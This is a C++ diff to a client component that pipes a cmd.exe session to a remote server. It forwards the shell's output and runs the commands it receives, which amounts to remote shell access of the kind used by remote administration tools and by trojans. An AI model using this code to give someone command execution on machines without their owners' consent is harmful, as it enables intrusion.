@@ -39,7 +39,7 @@ void CMD::cmdThread()
 	cmdOpen = true;
 	while (cmdOpen)
 	{
-		Sleep(250);
+		Sleep(100);
 		Client::clientptr->SendString(cmd.readCMD(), PacketType::CMDCommand);
 	}
 }
@@ -48,9 +48,10 @@ std::string CMD::readCMD()	//read string from stdOut of cmd.exe	//IMPLEMENT AS T
 {
 	if (cmdOpen)
 	{
-		DWORD bytesAvailable;
-		DWORD bytesRead;
-		char buffer[128];
+		DWORD bytesAvailable = 0;
+		DWORD bytesRead = 0;
+		int intBytesAvailable = 0;
+		char buffer[128] = "";
 		std::string output;
 
 		do		//loop until bytes are available (until response is processed)
@@ -58,13 +59,19 @@ std::string CMD::readCMD()	//read string from stdOut of cmd.exe	//IMPLEMENT AS T
 			PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &bytesAvailable, NULL);
 			Sleep(50);
 		} while (bytesAvailable <= 0);
-
-		while (bytesAvailable > 0)		//while there is something to read, read it into buffer and append buffer to string
+		/*
+		if (bytesAvailable >= 2048)
+			bytesAvailable = 2048;
+			*/
+		intBytesAvailable = bytesAvailable;
+		while (intBytesAvailable > 0)		//while there is something to read, read it into buffer and append buffer to string
 		{
 			ReadFile(g_hChildStd_OUT_Rd, buffer, 127, &bytesRead, NULL);
 			buffer[127] = '\0';	//NULL terminator of string
 			output += buffer;
-			bytesAvailable = bytesAvailable - bytesRead;
+			intBytesAvailable -= bytesRead;
+			if (intBytesAvailable <= 0)
+				intBytesAvailable = 0;
 			ZeroMemory(buffer, 128);					//clears buffer (else memory leak)
 		}
 		return output;
@@ -77,6 +84,7 @@ void CMD::writeCMD(std::string command)		//write a string to stdIn of cmd.exe
 {
 	if (cmdOpen)
 	{
+		command += '\n';	//apend '\n' to simulate "ENTER"
 		if (!WriteFile(g_hChildStd_IN_Wr, command.c_str(), command.size(), NULL, NULL))
 			Client::clientptr->SendString("Couldn't write command '" + command + "' to stdIn.", PacketType::Warning);
 	}
